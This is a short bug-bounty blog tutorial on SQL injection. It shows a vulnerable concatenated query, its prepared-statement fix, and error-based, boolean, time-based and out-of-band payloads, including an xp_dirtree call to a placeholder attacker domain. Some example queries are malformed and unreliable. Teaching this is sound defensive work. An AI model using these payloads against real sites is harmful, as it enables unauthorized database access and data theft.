---
title: Intro to SQL Injection
date: 2025-05-07 11:34:00 +0530
categories: [BugBounty,Web]
tags: [web]
---
![](https://github.com/sahil-rawat/assets/blob/master/IMG/BUG3.jpg?raw=true)



Structured Query Language (SQL) is the standard language used to communicate with relational databases. Any application that stores data in a persistent format most likely uses SQL.

A **SQL Injection (SQLi)** vulnerability allows an attacker to manipulate queries to the database. This could potentially let them **Create**, **Read**, **Update**, or **Delete** data posing a significant risk to application security.


## 🚨 What Causes SQL Injection?

SQL Injection occurs when:

* User input is directly concatenated into SQL queries without validation or sanitization.
* Applications fail to separate code from data in their database interactions.

### Unsafe Code Example:

```javascript
// Vulnerable code
const result = db.query("SELECT id FROM my_table WHERE id = " + request.query['id']);
```

This allows attackers to inject arbitrary SQL in the `id` parameter.

### Safe Alternative:

```javascript
// Safe with Prepared Statements
const query = db.prepare("SELECT id FROM my_table WHERE id = :id");
query.execute({ id: request.query['id'] });
```

Use **parameterized queries** to ensure user input is treated strictly as data.


## 🧬 Types of SQL Injection

### 1. Error-Based SQL Injection

Relies on the error messages thrown by the database to extract information.

**Example Error Message:**

> "You have an error in your SQL syntax; check the manual..."

Perform trial and error and observe the response

|Request|Response|
|-|-|
|example.com?id='|Error?|
|example.com?id="|Error?|
|example.com?id=`|Error?|
|example.com?id=[])|Error?|
---

For Example

|Request|Query|
|-|-|
|/app/news.php?id=1|SELECT articles.id AS article_id, users.username, user.iban FROM article INNER JOIN user ON articles.u_id=users.id WHERE article.u_id='1'|
|/app/news.php?id=1'|SELECT articles.id AS article_id, users.username, user.iban FROM article INNER JOIN user ON articles.u_id=users.id WHERE article.u_id='1''|
|/app/news.php?id=1'+AND+1=1--+|SELECT articles.id AS article_id, users.username, user.iban FROM article INNER JOIN user ON articles.u_id=users.id WHERE article.u_id='1' AND 1=1 - -'|
---


### 2. Blind SQL Injection

These are when application dosent return results of SQL Queries or errors  in any of its responses. These vulns are still exploitable but are a little more complex and difficult to perform.

- Can change the logic of query to obtain a detectable difference in applicaiton response, this could be obtained by injecting new condition in the query or triggering an error like divide by 0.

- Trigger Time Delay and infer the response based on the time taken by the application to process query

- Trigger an Out-Of-Band network interaction. this is extremely powerfull and works in cases when other techniques wont. Often done By exfiltrating data via the out-of-band channel by placing the data in a DNS lookup for the domain you control. 


#### Techniques:

* **Boolean-based:**

  * `' AND 1=1 --` (returns normal output)
  * `' AND 1=2 --` (returns blank or error)
* **Time-based:**

  * `'; WAITFOR DELAY '00:00:10' --`
* **Out-of-Band:**

  * `exec master..xp_dirtree '//yourdomain.com/ping'`


#### Analyze & Identify

|Request|Response|Analysis|
|-|-|-|
|?id=1" AND 1=1 --|True Condition → Response Received ?|Check weather Response received or not|
|?id=1" AND 1=2 --|False Condition → Invalid Response?|Invalid Response Check the difference from the valid request|

Also we can verify if a SQL Injection exist by entering the following commands

|Request|Response|
|-|-|
|1' AND sleep(5) --|Is there a delay?|
|'; WAITFOR DELAY '0:0:5' -- |Is there a delay?|


Once we know it have a vulnerability then How Blind SQL Works?

#### Ways to Exploit

|Request|Explainaiton|
|-|-|
|?id=1'(IF TRUE/VALID) THEN sleep(5)|If my expression is true then delay for 5 seconds otherwise do nothing|
|SELECT SUBSTRING(String,Start,Value)|We can Use substring to blindly check the value for data we are extracting [SELECT SUBSTRING("Sahil",1,1) ⇒ S], [SELECT SUBSTRING("Sahil",1,2) ⇒ SA], [SELECT SUBSTRING("Sahil",2,1) ⇒ A]|
|?id=1' AND substring(@@version),1,1=5|If True we receive no error and we know the app is running on MySQl Version 5.x


Happy Hunting 🔍🐞 

---

Thanks for Reading, Stay tuned for more ❤︎

If you enjoyed reading the article do follow me on:

[Twitter](https://twitter.com/sahil_s_rawat)

[LinkedIn](https://www.linkedin.com/in/sahil-singh-rawat)

[Website](https://www.sahilsinghrawat.com)

[GitHub](https://github.com/sahil-rawat)
